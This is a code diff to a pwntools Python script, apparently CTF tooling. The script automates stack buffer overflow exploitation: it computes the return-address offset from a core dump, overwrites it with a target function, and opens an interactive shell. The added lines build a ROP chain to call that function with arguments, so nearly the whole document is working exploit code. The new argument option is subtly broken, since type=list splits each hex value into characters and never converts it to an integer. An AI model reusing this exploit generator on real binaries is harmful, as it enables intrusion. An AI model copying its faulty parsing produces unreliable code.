@@ -8,7 +8,7 @@ if os.name == "nt":
     print("This script is not yet supported on Windows, sorry!")
     exit(1)
 
-from pwn import ELF, process, cyclic, Coredump, flat, context, cyclic_find
+from pwn import ELF, process, cyclic, Coredump, flat, context, cyclic_find, ROP, fit
 
 parser = argparse.ArgumentParser(
     prog="bflow.py",
@@ -20,6 +20,13 @@ parser.add_argument(
     help="Name of the symbol to overflow into, defaults to win",
     default="win",
     nargs="?",
+)
+parser.add_argument(
+    "-a",
+    "--args",
+    help="Arguments to pass to the function, seperated by spaces and in hex, e.g. 0xDEADBEEF 0xCAFEBABE",
+    type=list,
+    nargs="+",
 )
 cargs = parser.parse_args()
 
@@ -43,8 +50,14 @@ if cargs.symbol not in elf.symbols:
     exit(1)
 
 # Create a payload that should overwrite the return address with the address of the specified function
-#                      |<- padding ->|<- return address ->|
-payload = flat({cyclic_find(core.eip): elf.symbols[cargs.symbol]})
+if cargs.args is not None:
+    # If there are arguments to pass to the function, we need to create a ROP chain
+    rop = ROP(elf)
+    rop.call(cargs.symbol, cargs.args)
+    payload = fit({cyclic_find(core.eip): rop.chain()})
+else:
+    #                      |<- padding ->|<- return address ->|
+    payload = flat({cyclic_find(core.eip): elf.symbols[cargs.symbol]})
 
 # Send the final payload & drop to an interactive shell to get the flag
 p.sendline(payload)
